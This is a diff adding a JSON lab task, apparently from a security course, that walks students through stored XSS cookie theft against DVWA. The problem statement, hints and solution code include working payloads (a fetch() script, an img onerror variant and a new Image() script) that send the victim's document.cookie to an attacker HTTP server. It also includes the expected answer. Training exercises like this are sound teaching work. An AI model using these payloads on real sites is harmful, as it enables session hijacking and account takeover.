@@ -1,0 +1,14 @@
+{
+    "id": "task2",
+    "chapterId": "ch_8",
+    "title": "XSS Cookie Stealing",
+    "description": "Perform Stored XSS on DVWA to steal a cookie.",
+    "estimatedMinutes": 25,
+    "problemStatement": "# Objective\nExploit the Stored XSS vulnerability in DVWA to capture a visitor's session cookie.\n\n## Setup\n1.  Start a Python HTTP server on Kali: `python3 -m http.server 8000`\n2.  Log in to DVWA and set security to **Low**.\n3.  Navigate to **XSS (Stored)**.\n\n## Steps\n1.  Craft a payload that sends `document.cookie` to your Kali server.\n2.  Inject the payload into the Guestbook (Name or Message field).\n3.  Wait for the page to load (simulate a victim viewing the page).\n4.  Check your HTTP server logs for the incoming request with the cookie.\n\n## Payload Example\n```html\n<script>fetch('http://[Kali_IP]:8000/?c='+document.cookie)</script>\n```\n\n## Deliverable\nScreenshot of the HTTP server log showing the captured `PHPSESSID`.",
+    "hints": [
+        "If `fetch` is blocked, try `<img src=x onerror=\"this.src='http://[IP]:8000/?c='+document.cookie\">`",
+        "Ensure your Kali IP is reachable from Metasploitable (same Host-Only network)."
+    ],
+    "expectedOutput": "Log line: `GET /?c=PHPSESSID=abc123... HTTP/1.1`",
+    "solutionCode": "# Kali Terminal 1:\npython3 -m http.server 8000\n\n# In DVWA XSS (Stored) Name field:\n<script>new Image().src=\"http://192.168.56.102:8000/?c=\"+document.cookie</script>\n\n# Sign the guestbook, then reload the page. Check Kali terminal for the request."
+}
